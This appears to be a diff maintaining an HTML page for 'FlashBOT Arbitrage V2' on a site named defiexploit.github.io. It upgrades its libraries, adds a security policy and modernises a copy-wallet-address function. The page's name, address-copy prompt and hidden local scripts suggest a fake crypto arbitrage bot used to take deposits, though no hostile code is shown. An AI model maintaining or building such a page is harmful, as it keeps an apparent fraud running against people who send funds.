@@ -4,11 +4,11 @@
 <head>	  
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	
+	<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://ajax.googleapis.com https://cdnjs.cloudflare.com https://plausible.io; style-src 'self' https://cdnjs.cloudflare.com https://fonts.googleapis.com; img-src 'self' data:; connect-src 'self' https://api.cryptonator.com wss:;">
 	<title>FlashBOT Arbitrage V2</title>
 
 	<link rel="stylesheet" href="./assets/css/styles.css">
-	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
 	<script>var site = "defiexploit.github.io";</script>
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 	
@@ -78,15 +78,15 @@
 			  </div>
 	
 			  <script>
-				function copyRef(id)
+				async function copyRef(id)
 				{
-				var r = document.createRange();
-				r.selectNode(document.getElementById("input"));
-				window.getSelection().removeAllRanges();
-				window.getSelection().addRange(r);
-				document.execCommand('copy');
-				window.getSelection().removeAllRanges();
-				return alert("Address copied successfully!");
+				try {
+					await navigator.clipboard.writeText(document.getElementById("input").innerHTML);
+					alert("Address copied successfully!");
+				} catch (err) {
+					console.error('Failed to copy: ', err);
+					alert("Copy failed. Please copy manually.");
+				}
 				}
 	
 				var modal2 = document.getElementById("myModal");
@@ -239,7 +239,7 @@
 
 				setTimeout(function() {$('#out').fadeOut('fast');}, 19500);
 			</script>
-			<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+			<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
 			
 			<div style="padding: 15px;margin-top:-220px" id="out">
 				<div class="alert">
@@ -431,7 +431,7 @@
 		<a class="darking-menu" style="font-size: 12px;" ><p>© FlashBot 2021</p></a>
 	</ul>
 
-	<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.5/web3.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
 	<script src="./assets/js/addr.min.js?v=2"></script>
 	<script src="./assets/js/chain.min.js?v=2"></script>
